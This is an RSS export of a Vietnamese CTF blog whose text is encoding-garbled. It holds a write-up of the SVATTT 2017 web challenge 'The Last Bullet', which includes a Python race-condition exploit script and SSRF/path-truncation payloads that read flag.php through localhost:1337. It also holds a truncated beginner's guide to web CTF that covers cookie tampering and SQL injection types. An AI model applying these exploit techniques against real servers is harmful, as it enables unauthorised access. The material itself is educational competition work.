<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>@sting8k</title><description>@sting8k</description><link>http://localhost:2368/</link><generator>Ghost 0.7</generator><lastBuildDate>Tue, 21 Nov 2017 16:08:08 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>[SVATTT 2017] Writeup Web daemon: The Last Bullet</title><description>&lt;p&gt;Challenge:  &lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href="http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/"&gt;http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;M·ªôt ch√∫t th√≠nh l√∫c v√†o game: robots.txt&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;User-agent: *  
Disallow: /backkup-1337/  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;G·∫Øp ƒë∆∞·ª£c ra 3 c√°i params &lt;code&gt;insert&lt;/code&gt;, &lt;code&gt;access_key&lt;/code&gt; v√† &lt;code&gt;path&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;N·∫øu &lt;strong&gt;kh√¥ng&lt;/strong&gt; set param &lt;code&gt;insert&lt;/code&gt; =&gt; Select v√† hi·ªán k·∫øt qu·∫£ theo &lt;code&gt;access_key&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class="language-php"&gt;...
$access_key=mysql_real_escape_string($_GET['access_&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/svattt-2017-writeup-web-daemon-the-last-bullet/</link><guid isPermaLink="false">7191f76f-5686-4383-8531-6c9a319a83fa</guid><dc:creator>Do Anh</dc:creator><pubDate>Tue, 21 Nov 2017 14:02:00 GMT</pubDate><media:content url="http://localhost:2368/content/images/2017/11/wallhaven-494982-1.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2017/11/wallhaven-494982-1.png" alt="[SVATTT 2017] Writeup Web daemon: The Last Bullet"&gt;&lt;p&gt;Challenge:  &lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href="http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/"&gt;http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;M·ªôt ch√∫t th√≠nh l√∫c v√†o game: robots.txt&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;User-agent: *  
Disallow: /backkup-1337/  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;G·∫Øp ƒë∆∞·ª£c ra 3 c√°i params &lt;code&gt;insert&lt;/code&gt;, &lt;code&gt;access_key&lt;/code&gt; v√† &lt;code&gt;path&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;N·∫øu &lt;strong&gt;kh√¥ng&lt;/strong&gt; set param &lt;code&gt;insert&lt;/code&gt; =&gt; Select v√† hi·ªán k·∫øt qu·∫£ theo &lt;code&gt;access_key&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class="language-php"&gt;...
$access_key=mysql_real_escape_string($_GET['access_key']);

$sql = "SELECT url from local_bookmark where access_key='".$access_key."' order by id desc limit 1";
...
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;N·∫øu set param &lt;code&gt;insert&lt;/code&gt; =&gt; Insert v√†o db d·ªØ li·ªáu l·∫•y t·ª´ &lt;code&gt;access_key&lt;/code&gt; v√† &lt;code&gt;path&lt;/code&gt;, ngay sau ƒë√≥ th√¨ ... delete ?? üòÄ ??&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class="language-php"&gt;$url = "http://tradahacking.vn".$path."/phiasaumotcogai.html"; 

$url = mysql_real_escape_string($url);

if(preg_match('/(#|\?|&amp;amp;)/i', $url))  
    {
        exit('Bad words!');
    }
$sql = "INSERT INTO local_bookmark (url, access_key) VALUES ('" .$url. "', '".$access_key."');";
...
include_once("delete.php");  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Okay, select th√¨ m√©o c√≥ g√¨ ƒë·ªÉ select r·ªìi, insert th√¨ b·ªã delete ngay :v&lt;/p&gt;

&lt;p&gt;Nh∆∞ng ... &lt;br&gt;
Ngay t·ª´ ƒë·∫ßu khi ƒë·ªçc source, m√¨nh nh·∫≠n th·∫•y kh√° b·∫•t th∆∞·ªùng khi t√°c gi·∫£ lu√¥n ƒë·∫∑t h√†m connect, close db ·ªü t·ª´ng file, c·ªông th√™m vi·ªác v·ª´a insert v·ª´a delete nh√¨n v·ªôi vler üòÇ . &lt;/p&gt;

&lt;p&gt;&lt;img src="http://localhost:2368/content/images/2017/11/Screen-Shot-2017-11-21-at-9-36-03-PM.png" alt="[SVATTT 2017] Writeup Web daemon: The Last Bullet"&gt;&lt;/p&gt;

&lt;p&gt;Ya, n√≥ c√≥ m√πi &lt;strong&gt;Race condition&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Code khai th√°c:  &lt;/p&gt;

&lt;pre&gt;&lt;code class="language-python"&gt;import thread  
import time  
import requests  
import random

def exploit(access_key):  
    resp = requests.get("http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/index.php?path=xxx&amp;amp;insert=1&amp;amp;access_key=xxxxx"
                    +str(access_key))

try:  
    ak = random.randint(1000000,9999999)
    thread.start_new_thread( exploit, (ak,) )
    thread.start_new_thread( exploit, (ak,) )
    resp = requests.get("http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/index.php?access_key=xxxxx"+str(ak))
    print "http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/index.php?access_key=xxxxx"+str(ak)
    print resp.text
except:  
    print "Error: unable to start thread"
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src="http://localhost:2368/content/images/2017/11/Screen-Shot-2017-11-21-at-10-02-49-PM.png" alt="[SVATTT 2017] Writeup Web daemon: The Last Bullet"&gt;&lt;/p&gt;

&lt;p&gt;Insert ƒë∆∞·ª£c r·ªìi, gi·ªù sao?&lt;/p&gt;

&lt;p&gt;ƒê·ªÉ √Ω m·ªôt ch√∫t:&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-php"&gt;$url = "http://tradahacking.vn".$path."/phiasaumotcogai.html"; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ƒê√¢y l√† c√°i s·∫Ω ƒë∆∞·ª£c cho v√†o DB, v√† r·ªìi "b·ªã" select ra, ƒë·∫©y qua h√†m &lt;code&gt;file_get_contents&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-php"&gt;$sql = "SELECT url from local_bookmark where access_key='".$access_key."' order by id desc limit 1";
$result = $conn-&amp;gt;query($sql);

if ($result-&amp;gt;num_rows &amp;gt; 0) {  
    // output data of each row
    while($row = $result-&amp;gt;fetch_assoc()) {
        $bookmark = $row["url"];
        //echo "Your Temporary bookmark is: " . $bookmark."&amp;lt;br&amp;gt;";//For harder version, my Ninjas ;)
    echo "Ok, Ok !!! You win ;)";
    }
}
echo file_get_contents($bookmark);  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;T·ªõi l√∫c d√πng t·ªõi hint c·ªßa @g4mm4:  &lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Local System:1337&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;M√¨nh c√≥ th·ªÉ bi·∫øn c√°i &lt;code&gt;$url&lt;/code&gt; tr√™n kia th√†nh d·∫°ng nh∆∞ n√†y:  &lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://tradahacking.vn:xyz@localhost:1337/phiasaumotcogai.html  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thay v√¨ tradahacking.vn l√† domain th√¨ n√≥ s·∫Ω b·ªã chuy·ªÉn th√†nh username üòå&lt;/p&gt;

&lt;p&gt;Nh∆∞ng gi·ªù l·∫°i k·∫πt ti·∫øp ph√°t n·ªØa, c√°i c·∫ßn b√¢y l√† directory listing c·ªßa &lt;a href="http://localhost:1337"&gt;http://localhost:1337&lt;/a&gt; ch·ª© kh√¥ng ph·∫£i &lt;a href="http://localhost:1337/phiasaumotcogai.html"&gt;http://localhost:1337/phiasaumotcogai.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;May thay trong l√∫c ch∆∞a ra c√°i hint &lt;code&gt;local system:1337&lt;/code&gt; (m√† th·ª±c ra c√°i hint n√†y n√≥ c√≥ s·∫µn t·ª´ ƒë·∫ßu tr√™n title &lt;a href="http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/"&gt;Web&lt;/a&gt; r·ªìi &lt;br&gt;
 m√† m√¨nh k ƒë·ªÉ √Ω üò©), m√¨nh ƒë√£ ƒë·∫©y request tr√™n kia v·ªÅ server ri√™ng v√† fuzz linh tinh :v&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;119.81.181.252 - - [xx/Nov/2017 xx:xx:28] "GET /./././../../././././././././././././././/../././/phiasa HTTP/1.0" 404 -  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;√Ä h√°, path truncation. Do gi·ªõi h·∫°n s·ªë k√Ω t·ª± c·ªßa field url trong db.&lt;/p&gt;

&lt;p&gt;Nhi·ªám v·ª• b√¢y gi·ªù ch·ªâ l√† ƒë·∫©y request v·ªÅ server ri√™ng, truncate cho v·ª´a ƒë·ªß h·∫øt c√°i file html kia, xong thay l·∫°i localhost:1337 v√†o (cho ƒë·ª° nh·∫ßm l·∫´n üò•)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;index.php?path=:xyz@localhost:1337/.//./././../../././././././././././././././/.././././././&amp;amp;insert=1&amp;amp;access_key=xxxxx  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src="http://localhost:2368/content/images/2017/11/Screen-Shot-2017-11-21-at-10-39-36-PM.png" alt="[SVATTT 2017] Writeup Web daemon: The Last Bullet"&gt;&lt;/p&gt;

&lt;p&gt;Get flag.php  &lt;/p&gt;

&lt;pre&gt;&lt;code&gt;index.php?path=:wtf@localhost:1337/./././././././././././././././././././././././././flag.php&amp;amp;insert=1&amp;amp;access_key=xxxxx  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src="http://localhost:2368/content/images/2017/11/Screen-Shot-2017-11-21-at-10-41-55-PM.png" alt="[SVATTT 2017] Writeup Web daemon: The Last Bullet"&gt;&lt;/p&gt;</content:encoded></item><item><title>[CTF] L√†m th·∫ø n√†o ƒë·ªÉ b·∫Øt ƒë·∫ßu v·ªõi CTF m·∫£ng Web</title><description>&lt;p&gt;Web l√† m·ªôt trong nh·ªØng m·∫£ng d·ªÖ ti·∫øp c·∫≠n khi ch∆°i CTF. &lt;strong&gt;V·∫≠y b·∫Øt ƒë·∫ßu CTF m·∫£ng Web nh∆∞ th·∫ø n√†o?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Gi·ªù ƒë·∫∑t m·ªôt website tr∆∞·ªõc m·∫∑t m√¨nh th√¨ kh√¥ng th·ªÉ c·ª© th·∫ø m√† l√†m. L√†m g√¨? T√¨m flag - m·ªôt chu·ªói b√≠ m·∫≠t do ng∆∞·ªùi ra ƒë·ªÅ gi·∫•u ·ªü&lt;/p&gt;</description><link>http://localhost:2368/ctf-lam-the-nao-de-bat-dau-voi-ctf-mang-web/</link><guid isPermaLink="false">0deb8673-9a96-475a-9870-e210c2a3d7e1</guid><category>web</category><category>CTF</category><category>learn</category><category>beginner</category><category>sql</category><category>xss</category><category>lfi</category><category>rfi</category><dc:creator>Do Anh</dc:creator><pubDate>Mon, 07 Mar 2016 03:11:04 GMT</pubDate><media:content url="http://localhost:2368/content/images/2016/03/1024px-DEF_CON_17_CTF_competition.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2016/03/1024px-DEF_CON_17_CTF_competition.jpg" alt="[CTF] L√†m th·∫ø n√†o ƒë·ªÉ b·∫Øt ƒë·∫ßu v·ªõi CTF m·∫£ng Web"&gt;&lt;p&gt;Web l√† m·ªôt trong nh·ªØng m·∫£ng d·ªÖ ti·∫øp c·∫≠n khi ch∆°i CTF. &lt;strong&gt;V·∫≠y b·∫Øt ƒë·∫ßu CTF m·∫£ng Web nh∆∞ th·∫ø n√†o?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Gi·ªù ƒë·∫∑t m·ªôt website tr∆∞·ªõc m·∫∑t m√¨nh th√¨ kh√¥ng th·ªÉ c·ª© th·∫ø m√† l√†m. L√†m g√¨? T√¨m flag - m·ªôt chu·ªói b√≠ m·∫≠t do ng∆∞·ªùi ra ƒë·ªÅ gi·∫•u ·ªü ƒë√¢u ƒë√≥ quanh c√°i web. Mu·ªën t√¨m ƒë∆∞·ª£c n√≥ tr∆∞·ªõc h·∫øt ph·∫£i xem ƒë·ªÅ b√†i g·ª£i √Ω c√°i g√¨, cho c√°i g√¨, trong web c√≥ g√¨, l√†m sao ƒë·ªÉ khai th√°c m·∫•y c√°i ƒë√≥. T·ª´ ƒë√¢y l·∫°i c√≥ m·ªôt v·∫•n ƒë·ªÅ: &lt;strong&gt;Ph·∫£i hi·ªÉu v·ªÅ web tr∆∞·ªõc ƒë√£&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;N√≥i th√™m m·ªôt ch√∫t l√† ·ªü b√†i vi·∫øt n√†y m√¨nh s·∫Ω kh√¥ng ƒëi s√¢u v√†o chi ti√™t, m√¨nh ch·ªâ d·ª´ng l·∫°i ·ªü vi·ªác ƒë·∫∑t ra c√°c v·∫•n ƒë·ªÅ quan tr·ªçng m√† c√°c b·∫°n c·∫ßn t√¨m hi·ªÉu&lt;/em&gt;&lt;/p&gt;

&lt;hr&gt;

&lt;h4 id="webhotngthno"&gt;Web ho·∫°t ƒë·ªông th·∫ø n√†o?&lt;/h4&gt;

&lt;p&gt;Ch√∫ng ta s·∫Ω c·∫ßn n·∫Øm ki·∫øn th·ª©c v·ªÅ web qua nh·ªØng v·∫•n ƒë·ªÅ nh∆∞ th·∫ø n√†y:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;C√°ch ho·∫°t ƒë·ªông c·ªßa web t·ª´ ph√≠a client cho ƒë·∫øn ph√≠a server s·∫Ω c√≥ nh·ªØng g√¨? &lt;/li&gt;
&lt;li&gt;Client g·ª≠i request cho server v√† nh·∫≠n l·∫°i response nh∆∞ th·∫ø n√†o? Qua ƒë√¢u? (HTTP, HTTP Header, HTTP Methods)&lt;/li&gt;
&lt;li&gt;C√°ch client v√† server l∆∞u tr·ªØ th√¥ng tin c·ªßa nhau (qua c∆° s·ªü d·ªØ li·ªáu, cookie, session, ‚Ä¶).&lt;/li&gt;
&lt;li&gt;C√°c ng√¥n ng·ªØ c·∫•u th√†nh 1 trang web ho·∫∑c th∆∞·ªùng ƒë∆∞·ª£c d√πng khi x√¢y d·ª±ng web. (HTML, CSS, JS, PHP, SQL ...)&lt;/li&gt;
&lt;li&gt;Th√¥ng tin whois c·ªßa 1 trang web (ip, owner,...).&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="1linquannhttp"&gt;1. Li√™n quan ƒë·∫øn HTTP&lt;/h4&gt;

&lt;p&gt;M·ªói khi truy c·∫≠p m·ªôt website, t·ª´ ph√≠a client ph·∫£i g·ª≠i &lt;strong&gt;request&lt;/strong&gt; l√™n server qua &lt;strong&gt;giao th·ª©c HTTP&lt;/strong&gt;, v√† nh·ªØng request n√†y ƒë∆∞·ª£c th·ªÉ hi·ªán d∆∞·ªõi d·∫°ng &lt;strong&gt;HTTP header&lt;/strong&gt;. Gi·ªëng nh∆∞ vi·ªác mu·ªën g·ª≠i b·ª©c th∆∞ th√¨ ph·∫£i c√≥ ƒë·ªãa ch·ªâ nh·∫≠n, t√™n ng∆∞·ªùi vi·∫øt, th√¥ng tin v·ªÅ ng∆∞·ªùi vi·∫øt, n·ªôi dung dung th∆∞ th√¨ c√≥ y√™u c·∫ßu,... C√°c headers c≈©ng ch·ª©a nh·ªØng th√¥ng tin t∆∞∆°ng t·ª± nh∆∞ v·∫≠y.&lt;/p&gt;

&lt;p&gt;Nh·ªØng headers n√†y c√≥ r·∫•t nhi·ªÅu n√™n c√°c b·∫°n c√≥ th·ªÉ t·ª± google t√¨m hi·ªÉu. &lt;em&gt;ƒê·∫∑c bi·ªát l√† ch√∫ √Ω v·ªÅ &lt;strong&gt;cookie, user-agent&lt;/strong&gt;, l√† 2 tr∆∞·ªùng hay ƒë∆∞·ª£c d√πng trong c√°c b√†i ctf.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;G·ªßi m·ªôt HTTP request ƒëi c≈©ng c√≥ th·ªÉ g·ª≠i ƒë∆∞·ª£c b·∫±ng nhi·ªÅu d·∫°ng kh√°c nhau. C√°c d·∫°ng n√†y ch√≠nh l√† c√°c &lt;strong&gt;HTTP Methods&lt;/strong&gt; hay c√≤n g·ªçi l√† HTTP Verb. D·∫°ng c·ªßa n√≥ bao g·ªìm GET, POST, PUT, DELETE, OPTIONS,... Th∆∞·ªùng d√πng nh·∫•t l√† &lt;strong&gt;POST v√† GET&lt;/strong&gt;. C√°c b·∫°n n√™n t√¨m hi·ªÉu k·ªπ ƒëi·ªÉm gi·ªëng v√† kh√°c c·ªßa 2 methods n√†y. &lt;/p&gt;

&lt;p&gt;M·ªôt s·ªë b√†i khi d√πng POST, GET ƒë·ªÅu kh√¥ng nh·∫≠n ƒë∆∞·ª£c g√¨ t·ª´ ph√≠a server, nh∆∞ng khi ƒë·ªïi sang HEAD, PUT, ho·∫∑c method kh√°c th√¨ l·∫°i ra k·∫øt qu·∫£. L√Ω do l√† ·ªü file .htaccess ƒë√£ block 2 method ƒë√≥. Tham kh·∫£o:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.tutorialspoint.com/restful/restful_introduction.htm"&gt;http://www.tutorialspoint.com/restful/restful_introduction.htm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.htmlgoodies.com/beyond/webmaster/article.php/3899416/What-is-the-htaccess-File-and-What-Can-I-Do-With-It.htm"&gt;.htaccess l√† g√¨?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/11584101/restrict-post-request-the-server"&gt;.htaccess Restrict method POST GET&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;N√≥i ti·∫øp ƒë·∫øn &lt;strong&gt;response&lt;/strong&gt;. H·∫≥n c√°c b·∫°n ƒë√£ kh√¥ng √≠t l·∫ßn g·∫∑p nh·ªØng th√¥ng b√°o ki·ªÉu &lt;code&gt;404 Not Found&lt;/code&gt; ho·∫∑c &lt;code&gt;302 Forbidden&lt;/code&gt; khi truy c·∫≠p m·ªôt url n√†o ƒë√≥. ƒê√≥ l√† v√¨ sau m·ªôt request ƒë∆∞·ª£c g·ª≠i ƒë·∫øn server, ta s·∫Ω nh·∫≠n ƒë∆∞·ª£c response. Trong response, m·ªôt c√°i lu√¥n lu√¥n c√≥ l√† &lt;strong&gt;HTTP Status Code. M·ªói ƒë·∫ßu s·ªë 1xx 2xx 3xx 4xx 5xx c√≥ m·ªôt √Ω nghƒ©a kh√°c nhau.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Tham kh·∫£o: &lt;a href="http://aptech.vn/kien-thuc-tin-hoc/tim-hieu-co-ban-ve-http-va-dinh-dang-cua-cac-http-message.html"&gt;T√¨m hi·ªÉu c∆° b·∫£n v·ªÅ HTTP v√† ƒë·ªãnh d·∫°ng c·ªßa c√°c HTTP message&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src="http://localhost:2368/content/images/2016/03/Screen-Shot-2016-03-07-at-12-10-19-PM.png" alt="[CTF] L√†m th·∫ø n√†o ƒë·ªÉ b·∫Øt ƒë·∫ßu v·ªõi CTF m·∫£ng Web"&gt;&lt;/p&gt;

&lt;p&gt;Cu·ªëi c√πng l√† vi·ªác &lt;strong&gt;thao t√°c v·ªõi c√°c headers&lt;/strong&gt;. Tr√™n Firefox m√¨nh hay d√πng addon &lt;a href="https://addons.mozilla.org/en-US/firefox/addon/live-http-headers-fixed-by-dan"&gt;Live Http Headers&lt;/a&gt; ho·∫∑c &lt;a href="https://addons.mozilla.org/en-US/firefox/addon/tamper-data/"&gt;Tamper data&lt;/a&gt;. N√¢ng cao h∆°n c√°c b·∫°n h√£y t·∫≠p d√πng &lt;a href="https://curl.haxx.se/"&gt;curl&lt;/a&gt;, r·∫•t ti·ªán v√† c√≥ api cho nhi·ªÅu ng√¥n ng·ªØ l·∫≠p tr√¨nh.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Tham kh·∫£o: &lt;a href="http://curl.haxx.se/docs/httpscripting.html"&gt;http://curl.haxx.se/docs/httpscripting.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="2linquannccngnnglptrnhweb"&gt;2. Li√™n quan ƒë·∫øn c√°c ng√¥n ng·ªØ l·∫≠p tr√¨nh web&lt;/h4&gt;

&lt;p&gt;V·ªõi nhi·ªÅu b√†i CTF ch√∫ng ta s·∫Ω ph·∫£i ƒë·ªçc hi·ªÉu code, ph√¢n t√≠ch ho·∫∑c ƒëo√°n code. N√≥i chung ta c·∫ßn trang b·ªã ki·∫øn th·ª©c v·ªÅ l·∫≠p tr√¨nh, hi·ªÉu t·ª´ng ng√¥n ng·ªØ ƒë·ªÉ l√†m g√¨. V√≠ d·ª• nh∆∞ html, css th√¨ gi·ªõi h·∫°n c≈©ng ƒë·ªÉ th·ªÉ hi·ªán giao di·ªán web, ·ªü html5 "x·ªãn" h∆°n th√¨ l√†m ƒë∆∞·ª£c game g√¨ ƒë√≥; js th√¨ l√†m ƒë∆∞·ª£c nhi·ªÅu h∆°n, hi·ªáu ·ª©ng, t√≠nh to√°n ‚Ä¶, quan tr·ªçng m·∫•y th·∫±ng n√†y ƒë·ªÅu l√† ki·ªÉu ng√¥n ng·ªØ ·ªü ph√≠a client, t·ª©c l√† ch·∫°y ƒë∆∞·ª£c lu√¥n ·ªü ph√≠a m√°y m√¨nh, v√† m√¨nh xem ƒë∆∞·ª£c code g·ªëc c·ªßa n√≥.&lt;/p&gt;

&lt;p&gt;ƒê·ªëi v·ªõi PHP, ASP, JSP,... ƒë√¢y l√† c√°c ng√¥n ng·ªØ ƒë∆∞·ª£c bi√™n d·ªãch tr√™n server, v√† code g·ªëc th√¨ kh√¥ng xem ƒë∆∞·ª£c nh∆∞ng c√≥ r·∫•t nhi·ªÅu b√†i CTF ch·ªß ƒë·ªông cho ng∆∞·ªùi ch∆°i ƒë·ªçc code ƒë·ªÉ ph√¢n t√≠ch ho·∫∑c c√≥ l·ªói gi√∫p ta c√≥ th·ªÉ ƒë·ªçc code t·ª´ ƒë√≥ khai th√°c.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;T√∫m l·∫°i ta c·∫ßn h·ªçc HTML, CSS, JS v√† m·ªôt ng√¥n ng·ªØ server n√†o ƒë√≥ nh∆∞ PHP ho·∫∑c JSP (√≠t nh·∫•t ·ªü m·ª©c ƒë·ªçc hi·ªÉu).&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id="3linquanncookiesession"&gt;3. Li√™n quan ƒë·∫øn Cookie, Session&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;N·∫Øm ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a cookie, session&lt;/li&gt;
&lt;li&gt;N·∫Øm ƒë∆∞·ª£c c√°ch th·ª©c l∆∞u tr·ªØ c·ªßa cookie, session. &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;L∆∞u √Ω quan tr·ªçng l√† cookie c√≥ th·ªÉ thay ƒë·ªïi ƒë∆∞·ª£c ·ªü ph√≠a client. Session th√¨ ch·ªâ ƒë·ªïi ƒë∆∞·ª£c id (t·ª©c l√† l√†m m·ªõi id, ho·∫∑c l√†m r·ªóng id). Ph√≠a server n·∫øu ƒë·ªçc cookie ko ph√¢n bi·ªát ip, ƒë·∫∑c ƒëi·ªÉm tr√¨nh duy·ªát ng∆∞·ªùi d√πng,... th√¨ ta c√≥ th·ªÉ d·ª±a v√†o ƒë√≥ ƒë·ªÉ khai th√°c. V√≠ d·ª• x√°c th·ª±c admin qua cookie (c√≥ m·ªôt tr∆∞·ªùng id=1234; user=guest, gi·ªù n·∫øu s·ª≠a th√†nh id=1;user=admin th√¨ s·∫Ω c√≥ th·ªÉ ƒëƒÉng nh·∫≠p d∆∞·ªõi quy·ªÅn admin).&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;M·ªôt v√≠ d·ª• r·∫•t c∆° b·∫£n v·ªÅ cookie: &lt;a href="https://www.youtube.com/watch?v=NrC3129Q55c"&gt;https://www.youtube.com/watch?v=NrC3129Q55c&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Gi·∫£i th√≠ch m·ªôt ch√∫t v·ªÅ clip ph√≠a tr√™n nh∆∞ sau.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Ph√≠a server c√≥ m·ªôt ƒëo·∫°n code ki·ªÉu nh∆∞ th·∫ø n√†y:&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class="language-javascript"&gt;&amp;lt;?php  
if(!isset($_COOKIE[‚Äòrestricted_login‚Äô])){ //check c√≥ tr∆∞·ªùng cookie restricted_login ch∆∞a?  
    setcookie(‚Äòrestricted_login‚Äô,‚Äôfalse‚Äô); // n·∫øu ch∆∞a th√¨ set v·ªõi gi√° tr·ªã l√† False
} else { // N·∫øu ƒë√£ c√≥ tr∆∞·ªùng restricted_login
    if($_COOKIE[‚Äòrestricted_login‚Äô] == ‚Äòtrue‚Äô){ //n·∫øu gi√° tr·ªã l√† true th√¨ qua b√†n
    // Qua b√†n, + ƒëi·ªÉm, blah blah ...
    }
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ƒêo·∫°n code n√†y s·∫Ω ki·ªÉm tra xem ·ªü ph√≠a client c√≥ tr∆∞·ªùng cookie l√† &lt;code&gt;restricted_login&lt;/code&gt; ch∆∞a, n·∫øu ch∆∞a c√≥ th√¨ th√™m v√†o v√† c√≥ gi√° tr·ªã l√† &lt;code&gt;false&lt;/code&gt;. N·∫øu ƒë√£ c√≥ th√¨ ki·ªÉm tra gi√° tr·ªã c·ªßa &lt;code&gt;restricted_login&lt;/code&gt;, gi√° tr·ªã b·∫±ng &lt;code&gt;true&lt;/code&gt; th√¨ ƒë∆∞·ª£c ph√©p qua b√†n.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Trong CTF ƒë·ªëi khi c√≥ m·ªôt b√†i SQL injection qua cookie. N√≥i chung cookie c≈©ng l√† d·ªØ li·ªáu t·ª´ ph√≠a ng∆∞·ªùi d√πng, t·ª©c l√† m√¨nh c√≥ th·ªÉ thay ƒë·ªïi, v√† truy·ªÅn c√°c d·ªØ li·ªáu sai tr√°i l√™n server.&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id="4linquannsqlinjection"&gt;4. Li√™n quan ƒë·∫øn SQL Injection&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;SQL injection c∆° b·∫£n&lt;/li&gt;
&lt;li&gt;SQL injection - Blind: Kh√¥ng th·ªÉ tr·ª±c ti·∫øp get ra ƒëo·∫°n d·ªØ li·ªáu m√¨nh mu·ªën v√† ph·∫£i get t·ª´ng k√Ω t·ª±, ho·∫∑c d·ª±a v√† c√°c c√¢u l·ªánh ƒëi·ªÅu ki·ªán ƒë√∫ng sai,... &lt;/li&gt;
&lt;li&gt;SQL injection - Error based: C√≥ th·ªÉ n√≥i l√† m·ªü r·ªông c·ªßa blind, t√πy v√†o d·ªØ li·ªáu ƒë√∫ng ho·∫∑c sai m√† server tr·∫£ v·ªÅ k·∫øt qu·∫£ kh√°c nhau.&lt;/li&gt;
&lt;li&gt;SQL injection - Time based: D√πng m·ªôt c√¢u l·ªánh SQL ch·ª©a l·ªánh Sleep(), ho·∫∑c m·ªôt h√†m n√†o ƒë√≥ ƒë·ªÉ ngh·ªâ khi g·∫∑p ƒëi·ªÅu ki·ªán ƒë√∫ng. V√≠ d·ª• IF(ƒëi·ªÅu ki·ªán, ƒëi·ªÅu ki·ªán n·∫øu ƒë√∫ng-&gt; Sleep(10), ƒëk n·∫øu sai -&gt; null) &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;SQL Injection c∆° b·∫£n m√¨nh h·ªçc qua course n√†y, c√≥ th·ªÉ ko c·∫ßn h·ªçc h·∫øt, ch·ªâ c·∫ßn n·∫Øm r√µ c√°ch khai th√°c qua SQL sau ƒë√≥ c√≥ th·ªÉ t·ª± t√¨m hi·ªÉu th√™m t√πy b√†i ctf: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://newdemy.com/courses/sql-injection-online-course-by-hitesh-choudhary"&gt;http://newdemy.com/courses/sql-injection-online-course-by-hitesh-choudhary&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="5localremotefileinclusion"&gt;5. Local &amp;amp; Remote File Inclusion&lt;/h4&gt;

